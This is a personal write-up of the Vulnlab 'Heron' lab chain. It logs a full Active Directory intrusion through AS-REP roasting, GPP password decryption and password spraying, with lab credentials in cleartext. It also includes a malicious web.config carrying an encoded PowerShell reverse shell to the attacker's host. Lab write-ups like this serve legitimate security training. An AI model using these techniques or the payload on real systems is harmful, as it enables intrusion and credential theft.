---
title: Vulnlab - Heron
date: 2025-01-17 02:30:00 +/-TTTT
categories: [VulnLab]
tags: [gpp-decyrpt, WriteAccountRestricitons, RBCD]     # TAG names should always be lowercase
image : /assets/images/heron_slide.png
---

its starting with 
pentest:Heron123!
## nmap
10.10.163.85

10.10.163.86

    ➜  hybrid nmap -p 22 10.10.163.85
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 18:20 EST
    Nmap scan report for 10.10.163.85
    Host is up (0.061s latency).

    PORT   STATE    SERVICE
    22/tcp filtered ssh

    Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
    ➜  hybrid nmap -p 22 10.10.163.86
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 18:20 EST
    Nmap scan report for 10.10.163.86
    Host is up (0.062s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh

### ssh-enum

    pentest@frajmp:/var$ cat /etc/hosts
    127.0.0.1 localhost frajmp.heron.vl
    127.0.1.1 frajmp

    # The following lines are desirable for IPv6 capable hosts
    ::1     ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters

### socks-forwarding

    ➜  heron scp chisel_linux pentest@10.10.163.86:/tmp
    ****************************************************
    *              Welcome to Heron Corp               *
    *  Unauthorized access to 'frajmp.heron.vl' is     *
    *  forbidden and will be prosecuted by law.        *
    ****************************************************
    (pentest@10.10.163.86) Password: 
    chisel_linux                                                                                100% 8736KB 953.2KB/s   00:09    

commands

    ➜  heron ./chisel_linux server --reverse -p 3000
    2025/01/16 18:42:28 server: Reverse tunnelling enabled
    2025/01/16 18:42:28 server: Fingerprint JGg/XcyjlqKDqaMi8IGooWebgt3RtZlR5AvJJNATwQk=
    2025/01/16 18:42:28 server: Listening on http://0.0.0.0:3000
    2025/01/16 18:42:51 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening


    pentest@frajmp:/tmp$ ./chisel_linux client 10.8.2.152:3000 R:socks
    2025/01/16 23:42:50 client: Connecting to ws://10.8.2.152:3000
    2025/01/16 23:42:50 client: Connected (Latency 60.32003ms)

now we have access on 85

    ➜  heron proxychains nxc smb 10.10.163.85
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:135  ...  OK
    SMB         10.10.163.85    445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    ➜  heron 

realized web site

    ➜  heron scp nmap pentest@10.10.163.86:/tmp
    ****************************************************
    *              Welcome to Heron Corp               *
    *  Unauthorized access to 'frajmp.heron.vl' is     *
    *  forbidden and will be prosecuted by law.        *
    ****************************************************
    (pentest@10.10.163.86) Password: 
    nmap   

nmap at ssh shell

    pentest@frajmp:/tmp$ ./nmap -p 80 10.10.163.85

    Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-01-16 23:47 UTC
    Unable to find nmap-services!  Resorting to /etc/services
    Cannot find nmap-payloads. UDP payloads are disabled.
    Nmap scan report for 10.10.163.85
    Host is up (0.00054s latency).
    PORT   STATE SERVICE
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds

![alt text](<../assets/images/1 (4).png>)

users lst

    ➜  heron cat website-user.txt 
    Wayne Wood

    CEO

    Email: wayne.wood@heron.vl
    Julian Pratt

    Head of IT

    Email: julian.pratt@heron.vl
    Samuel Davies

    Accounting

    Email: samuel.davies@heron.vl

    ➜  heron cat website-user.txt | grep -i "Email" | cut -d '@' -f1 | awk '{print $2}'
    wayne.wood
    julian.pratt
    samuel.davies

### Kerberoas

    ➜  heron proxychains impacket-GetNPUsers 'heron.vl/' -usersfile users.txt -dc-ip MUCDC
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] DLL init: proxychains-ng 4.17
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:88  ...  OK
    [-] User wayne.wood doesn't have UF_DONT_REQUIRE_PREAUTH set
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:88  ...  OK
    [-] User julian.pratt doesn't have UF_DONT_REQUIRE_PREAUTH set
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:88  ...  OK
    $krb5asrep$23$samuel.davies@HERON.VL:37eda5775ec6c0ab937c7617ac9c5217$e73ab656871d061aba9a8532f5b79c687d766c9f658055dd4f06e348cbc901f98f8e031aaa948cf165081f45e3865f0356f73c909a56438fc437d49e807f72b568fa353a6d0e9b41a895727ae2a9abe1171b86a29025b59972816320b9b716e6cdc7002be84790f7c416ac5562a8d0fd1536dda2917e80447dd01df00ad3073182d15c555198842f1e982eb2b02faa66ef5939fd108a51b4063f5ffaadd7de42750e2a3c35c0c9b4ff102bf7bda16ddd06e047c74084c40c23ff6c016c7d60d8bb6dadebf2c592b9aac3f750f630e790c5f0d14e7d7e8176d00e163425da87894b856487

crack hash

    ➜  heron john samuel_hash --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    l6fkiy9oN        ($krb5asrep$23$samuel.davies@HERON.VL)  

### password spray

    ➜  heron proxychains nxc smb MUCDC -u users.txt -p 'l6fkiy9oN' --shares
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         224.0.0.1       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    SMB         224.0.0.1       445    MUCDC            [-] heron.vl\wayne.wood:l6fkiy9oN STATUS_LOGON_FAILURE 
    SMB         224.0.0.1       445    MUCDC            [-] heron.vl\julian.pratt:l6fkiy9oN STATUS_LOGON_FAILURE 
    SMB         224.0.0.1       445    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN 
    SMB         224.0.0.1       445    MUCDC            [*] Enumerated shares
    SMB         224.0.0.1       445    MUCDC            Share           Permissions     Remark
    SMB         224.0.0.1       445    MUCDC            -----           -----------     ------
    SMB         224.0.0.1       445    MUCDC            accounting$                     
    SMB         224.0.0.1       445    MUCDC            ADMIN$                          Remote Admin
    SMB         224.0.0.1       445    MUCDC            C$                              Default share
    SMB         224.0.0.1       445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share                                                                                                                             
    SMB         224.0.0.1       445    MUCDC            home$           READ            
    SMB         224.0.0.1       445    MUCDC            IPC$                            Remote IPC
    SMB         224.0.0.1       445    MUCDC            it$                             
    SMB         224.0.0.1       445    MUCDC            NETLOGON        READ            Logon server share 
    SMB         224.0.0.1       445    MUCDC            SYSVOL          READ            Logon server share 
    SMB         224.0.0.1       445    MUCDC            transfer$       READ,WRITE   

we can get full users list at home$ shares

    ➜  heron proxychains smbclient -U 'samuel.davies' '//10.10.163.85/home$' 
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:445  ...  OK
    Password for [WORKGROUP\samuel.davies]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Sat Jun  1 11:10:46 2024
    ..                                DHS        0  Sun Jun  2 11:26:14 2024
    Adam.Harper                         D        0  Sat Jun  1 11:10:46 2024
    Adam.Matthews                       D        0  Sat Jun  1 11:10:46 2024
    adm_hoka                            D        0  Sat Jun  1 11:10:46 2024
    adm_prju                            D        0  Sat Jun  1 11:10:46 2024
    Alice.Hill                          D        0  Sat Jun  1 11:10:46 2024
    Amanda.Williams                     D        0  Sat Jun  1 11:10:46 2024
    Anthony.Goodwin                     D        0  Sat Jun  1 11:10:46 2024
    Carol.John                          D        0  Sat Jun  1 11:10:46 2024
    Danielle.Harrison                   D        0  Sat Jun  1 11:10:46 2024
    Geraldine.Powell                    D        0  Sat Jun  1 11:10:46 2024
    Jane.Richards                       D        0  Sat Jun  1 11:10:46 2024
    Jayne.Johnson                       D        0  Sat Jun  1 11:10:46 2024
    Julian.Pratt                        D        0  Sun Jun  2 06:47:14 2024
    Katherine.Howard                    D        0  Sat Jun  1 11:10:46 2024
    Mohammed.Parry                      D        0  Sat Jun  1 11:10:46 2024
    Rachael.Boyle                       D        0  Sat Jun  1 11:10:46 2024
    Rhys.George                         D        0  Sat Jun  1 11:10:46 2024
    Rosie.Evans                         D        0  Sat Jun  1 11:10:46 2024
    Samuel.Davies                       D        0  Sat Jun  1 11:10:46 2024
    Steven.Thomas                       D        0  Sat Jun  1 11:10:46 2024
    Vanessa.Anderson                    D        0  Sat Jun  1 11:10:46 2024
    Wayne.Wood                          D        0  Sat Jun  1 11:10:46 2024

i chceked which Policies last changed and i realized its third one 

    smb: \heron.vl\Policies\> dir
    .                                   D        0  Tue Jun  4 11:57:41 2024
    ..                                  D        0  Sun May 26 05:38:59 2024
    {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sun May 26 05:37:44 2024
    {3FFDA928-A6D1-4860-936F-25D9D2D7EAEF}      D        0  Sun May 26 06:21:54 2024
    {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sun May 26 05:37:44 2024
    {6CC75E8D-586E-4B13-BF80-B91BEF1F221C}      D        0  Tue Jun  4 11:57:41 2024
    {866ECED1-24B0-46EF-92F5-652345A1820C}      D        0  Sun May 26 06:23:29 2024

and got this

    smb: \heron.vl\Policies\{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}\Machine\Preferences\Groups\> dir
    .                                   D        0  Tue Jun  4 11:59:44 2024
    ..                                  D        0  Tue Jun  4 11:59:44 2024
    Groups.xml                          A     1135  Tue Jun  4 12:01:07 2024

                    6261499 blocks of size 4096. 1963462 blocks available
    smb: \heron.vl\Policies\{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}\Machine\Preferences\Groups\> get Groups.xml 
    getting file \heron.vl\Policies\{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}\Machine\Preferences\Groups\Groups.xml of size 1135 as Groups.xml (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec

## gpp-decyrpt

    ➜  heron cat Groups.xml 
    <?xml version="1.0" encoding="utf-8"?>
    <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2024-06-04 15:59:45" uid="{535B586D-9541-4420-8E32-224F589E4F3A}"><Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)"><Members><Member name="HERON\svc-web-accounting" action="ADD" sid="S-1-5-21-1568358163-2901064146-3316491674-24602"/><Member name="HERON\svc-web-accounting-d" action="ADD" sid="S-1-5-21-1568358163-2901064146-3316491674-26101"/></Members></Properties></Group>
            <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2024-06-04 16:00:13" uid="{F3B0115E-D062-46CC-B10C-C3EB743C824A}"><Properties action="U" newName="_local" fullName="" description="local administrator" cpassword="1G19pP9gbIPUr5xLeKhEUg==" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/></User>

https://github.com/t0thkr1s/gpp-decrypt

    (myenv) ➜  gpp-decrypt git:(master) python3 gpp-decrypt.py -f ../Groups.xml 
    /home/elliot/Documents/Vulnlab/Chains/heron/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence '\ '
    banner = '''

                                __                                __ 
    ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
    / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
    \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
    /___/  /_/    /_/                                /___/  /_/         

    [ * ] Username: Administrator (built-in)
    [ * ] Password: H3r0n2024#!

but we dont need this nxc can also do this

    ➜  heron proxychains nxc smb MUCDC -u samuel.davies -p 'l6fkiy9oN' -M gpp_password
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         224.0.0.1       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    SMB         224.0.0.1       445    MUCDC            [+] heron.vl\samuel.davies:l6fkiy9oN 
    SMB         224.0.0.1       445    MUCDC            [*] Enumerated shares
    SMB         224.0.0.1       445    MUCDC            Share           Permissions     Remark
    SMB         224.0.0.1       445    MUCDC            -----           -----------     ------
    SMB         224.0.0.1       445    MUCDC            accounting$                     
    SMB         224.0.0.1       445    MUCDC            ADMIN$                          Remote Admin
    SMB         224.0.0.1       445    MUCDC            C$                              Default share
    SMB         224.0.0.1       445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share                                                                                                                             
    SMB         224.0.0.1       445    MUCDC            home$           READ            
    SMB         224.0.0.1       445    MUCDC            IPC$                            Remote IPC
    SMB         224.0.0.1       445    MUCDC            it$                             
    SMB         224.0.0.1       445    MUCDC            NETLOGON        READ            Logon server share 
    SMB         224.0.0.1       445    MUCDC            SYSVOL          READ            Logon server share 
    SMB         224.0.0.1       445    MUCDC            transfer$       READ,WRITE      
    GPP_PASS... 224.0.0.1       445    MUCDC            [+] Found SYSVOL share
    GPP_PASS... 224.0.0.1       445    MUCDC            [*] Searching for potential XML files containing passwords
    SMB         224.0.0.1       445    MUCDC            [*] Started spidering
    SMB         224.0.0.1       445    MUCDC            [*] Spidering .
    SMB         224.0.0.1       445    MUCDC            //224.0.0.1/SYSVOL/heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml [lastm:'2024-06-04 12:01' size:1135]                                                  
    SMB         224.0.0.1       445    MUCDC            [*] Done spidering (Completed in 9.438229084014893)
    GPP_PASS... 224.0.0.1       445    MUCDC            [*] Found heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
    GPP_PASS... 224.0.0.1       445    MUCDC            [+] Found credentials in heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
    GPP_PASS... 224.0.0.1       445    MUCDC            Password: H3r0n2024#!
    GPP_PASS... 224.0.0.1       445    MUCDC            action: U
    GPP_PASS... 224.0.0.1       445    MUCDC            newName: _local
    GPP_PASS... 224.0.0.1       445    MUCDC            fullName: 
    GPP_PASS... 224.0.0.1       445    MUCDC            description: local administrator
    GPP_PASS... 224.0.0.1       445    MUCDC            changeLogon: 0
    GPP_PASS... 224.0.0.1       445    MUCDC            noChange: 0
    GPP_PASS... 224.0.0.1       445    MUCDC            neverExpires: 1
    GPP_PASS... 224.0.0.1       445    MUCDC            acctDisabled: 0
    GPP_PASS... 224.0.0.1       445    MUCDC            subAuthority: RID_ADMIN
    GPP_PASS... 224.0.0.1       445    MUCDC            userName: Administrator (built-in)

HERON\svc-web-accounting-d : H3r0n2024#!

now we have access on accounting shares

    ➜  heron proxychains nxc smb MUCDC -u 'svc-web-accounting-d' -p 'H3r0n2024#!' --shares
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         224.0.0.1       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    SMB         224.0.0.1       445    MUCDC            [+] heron.vl\svc-web-accounting-d:H3r0n2024#! 
    SMB         224.0.0.1       445    MUCDC            [*] Enumerated shares
    SMB         224.0.0.1       445    MUCDC            Share           Permissions     Remark
    SMB         224.0.0.1       445    MUCDC            -----           -----------     ------
    SMB         224.0.0.1       445    MUCDC            accounting$     READ,WRITE      
    SMB         224.0.0.1       445    MUCDC            ADMIN$                          Remote Admin
    SMB         224.0.0.1       445    MUCDC            C$                              Default share
    SMB         224.0.0.1       445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share                                                                                                                             
    SMB         224.0.0.1       445    MUCDC            home$           READ            
    SMB         224.0.0.1       445    MUCDC            IPC$                            Remote IPC
    SMB         224.0.0.1       445    MUCDC            it$                             
    SMB         224.0.0.1       445    MUCDC            NETLOGON        READ            Logon server share 
    SMB         224.0.0.1       445    MUCDC            SYSVOL          READ            Logon server share 

### webserver (accounting)

    ➜  heron proxychains smbclient -U 'svc-web-accounting-d' '//10.10.163.85/accounting$'
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:445  ...  OK
    Password for [WORKGROUP\svc-web-accounting-d]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Thu Jan 16 19:22:05 2025
    ..                                DHS        0  Sun Jun  2 11:26:14 2024
    AccountingApp.deps.json             A    37407  Sun Jun  2 15:25:26 2024
    AccountingApp.dll                   A    89600  Sun Jun  2 15:25:26 2024
    AccountingApp.exe                   A   140800  Sun Jun  2 15:25:26 2024
    AccountingApp.pdb                   A    39488  Sun Jun  2 15:25:26 2024
    AccountingApp.runtimeconfig.json      A      557  Sat Jun  1 18:22:20 2024
    appsettings.Development.json        A      127  Sat Jun  1 18:00:54 2024
    appsettings.json                    A      237  Sat Jun  1 18:03:50 2024
    FinanceApp.db                       A   106496  Sat Jun  1 10:09:00 2024
    Microsoft.AspNetCore.Authentication.Negotiate.dll      A    53920  Wed Nov  1 05:08:26 2023
    Microsoft.AspNetCore.Cryptography.Internal.dll      A    52912  Mon May 20 08:23:52 2024
    Microsoft.AspNetCore.Cryptography.KeyDerivation.dll      A    23712  Mon May 20 08:23:56 2024
    Microsoft.AspNetCore.Identity.EntityFrameworkCore.dll      A   108808  Mon May 20 08:24:24 2024
    Microsoft.Data.Sqlite.dll           A   172992  Mon May 20 03:54:40 2024
    Microsoft.EntityFrameworkCore.Abstractions.dll      A    34848  Mon May 20 03:54:30 2024
    Microsoft.EntityFrameworkCore.dll      A  2533312  Mon May 20 03:55:04 2024
    Microsoft.EntityFrameworkCore.Relational.dll      A  1991616  Mon May 20 03:55:20 2024
    Microsoft.EntityFrameworkCore.Sqlite.dll      A   257456  Mon May 20 03:55:30 2024
    Microsoft.Extensions.DependencyModel.dll      A    79624  Tue Oct 31 18:59:24 2023
    Microsoft.Extensions.Identity.Core.dll      A   177840  Mon May 20 08:24:10 2024
    Microsoft.Extensions.Identity.Stores.dll      A    45232  Mon May 20 08:24:20 2024
    Microsoft.Extensions.Options.dll      A    64776  Thu Jan 18 06:05:26 2024
    runtimes                            D        0  Sat Jun  1 10:51:32 2024
    SQLitePCLRaw.batteries_v2.dll       A     5120  Wed Aug 23 22:41:24 2023
    SQLitePCLRaw.core.dll               A    50688  Wed Aug 23 22:38:38 2023
    SQLitePCLRaw.provider.e_sqlite3.dll      A    35840  Wed Aug 23 22:38:52 2023
    System.DirectoryServices.Protocols.dll      A    71944  Tue Oct 31 19:00:24 2023
    web.config                          A      554  Thu Jun  6 10:41:39 2024
    wwwroot                             D        0  Sat Jun  1 10:51:32 2024

### web.config

    ➜  accounting cat web.config 
    <?xml version="1.0" encoding="utf-8"?>
    <configuration>
    <location path="." inheritInChildApplications="false">
        <system.webServer>
        <handlers>
            <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
        </handlers>
        <aspNetCore processPath="dotnet" arguments=".\AccountingApp.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
        </system.webServer>
    </location>
    </configuration>
    <!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->#

http://accounting.heron.vl/ login here with svc-web creds

and upload our malicious web.config

    <?xml version="1.0" encoding="utf-8"?>  
    <configuration>  
    <location path="." inheritInChildApplications="false">  
        <system.webServer>  
        <handlers>  
            <add name="aspNetCore" path="execute.now" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />  
        </handlers>  
        <aspNetCore processPath="powershell" arguments="-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADIALgAxADUAMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" hostingModel="OutOfProcess" />  
        </system.webServer>  
    </location>  
    </configuration>  
    <!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->

get shell

    pentest@frajmp:/tmp$ nc -nvlp 9001
    Listening on 0.0.0.0 9001
    Connection received on 10.10.163.85 64690

    PS C:\webaccounting> whoami
    heron\svc-web-accounting

### root shell

    PS C:\windows\scripts> more ssh.ps1
    $plinkPath = "C:\Program Files\PuTTY\plink.exe"
    $targetMachine = "frajmp"
    $user = "_local"
    $password = "Deplete5DenialDealt"
    & "$plinkPath" -ssh -batch $user@$targetMachine -pw $password "ps auxf; ls -lah /home; exit"

    pentest@frajmp:/tmp$ su root
    Password: 
    root@frajmp:/tmp# ls
    chisel_linux      systemd-private-7f4cea77256045e4a0e14b52760697d5-ModemManager.service-GRVIqy
    nmap              systemd-private-7f4cea77256045e4a0e14b52760697d5-systemd-logind.service-ltn7OL
    snap-private-tmp  systemd-private-7f4cea77256045e4a0e14b52760697d5-systemd-timesyncd.service-Fhw0sO
    root@frajmp:/tmp# whoami
    root

### password-spray

    ➜  heron proxychains nxc smb MUCDC -u users.txt -p 'Deplete5DenialDealt' --continue-on-success     
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:135  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK
    SMB         224.0.0.1       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
    SMB         224.0.0.1       445    MUCDC            [-] heron.vl\wayne.wood:Deplete5DenialDealt STATUS_LOGON_FAILURE 
    SMB         224.0.0.1       445    MUCDC            [+] heron.vl\julian.pratt:Deplete5DenialDealt 
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MUCDC:445  ...  OK

## adm_prju

    ➜  accounting proxychains smbclient -U 'julian.pratt' '//10.10.163.85/home$'      
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.163.85:445  ...  OK
    Password for [WORKGROUP\julian.pratt]:
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Sat Jun  1 11:10:46 2024
    ..                                DHS        0  Sun Jun  2 11:26:14 2024
    Adam.Harper                         D        0  Sat Jun  1 11:10:46 2024
    Adam.Matthews                       D        0  Sat Jun  1 11:10:46 2024
    adm_hoka                            D        0  Sat Jun  1 11:10:46 2024
    adm_prju                            D        0  Sat Jun  1 11:10:46 2024
    Alice.Hill                          D        0  Sat Jun  1 11:10:46 2024
    Amanda.Williams                     D        0  Sat Jun  1 11:10:46 2024
    Anthony.Goodwin                     D        0  Sat Jun  1 11:10:46 2024
    Carol.John                          D        0  Sat Jun  1 11:10:46 2024
    Danielle.Harrison                   D        0  Sat Jun  1 11:10:46 2024
    Geraldine.Powell                    D        0  Sat Jun  1 11:10:46 2024
    Jane.Richards                       D        0  Sat Jun  1 11:10:46 2024
    Jayne.Johnson                       D        0  Sat Jun  1 11:10:46 2024
    Julian.Pratt                        D        0  Sun Jun  2 06:47:14 2024
    Katherine.Howard                    D        0  Sat Jun  1 11:10:46 2024
    Mohammed.Parry                      D        0  Sat Jun  1 11:10:46 2024
    Rachael.Boyle                       D        0  Sat Jun  1 11:10:46 2024
    Rhys.George                         D        0  Sat Jun  1 11:10:46 2024
    Rosie.Evans                         D        0  Sat Jun  1 11:10:46 2024
    Samuel.Davies                       D        0  Sat Jun  1 11:10:46 2024
    Steven.Thomas                       D        0  Sat Jun  1 11:10:46 2024
    Vanessa.Anderson                    D        0  Sat Jun  1 11:10:46 2024
    Wayne.Wood                          D        0  Sat Jun  1 11:10:46 2024

                    6261499 blocks of size 4096. 1960954 blocks available
    smb: \> cd Julian.Pratt\
    smb: \Julian.Pratt\> dir
    .                                   D        0  Sun Jun  2 06:47:14 2024
    ..                                  D        0  Sat Jun  1 11:10:46 2024
    frajmp.lnk                          A     1443  Sun Jun  2 06:47:47 2024
    Is there a way to -auto login- in PuTTY with a password- - Super User.url      A      117  Sat Jun  1 11:44:44 2024
    Microsoft Edge.lnk                  A     2312  Sat Jun  1 11:44:38 2024
    mucjmp.lnk                          A     1441  Sun Jun  2 06:47:33 2024

                    6261499 blocks of size 4096. 1960954 blocks available
    smb: \Julian.Pratt\> mget *
    Get file frajmp.lnk? y
    getting file \Julian.Pratt\frajmp.lnk of size 1443 as frajmp.lnk (5.3 KiloBytes/sec) (average 5.3 KiloBytes/sec)
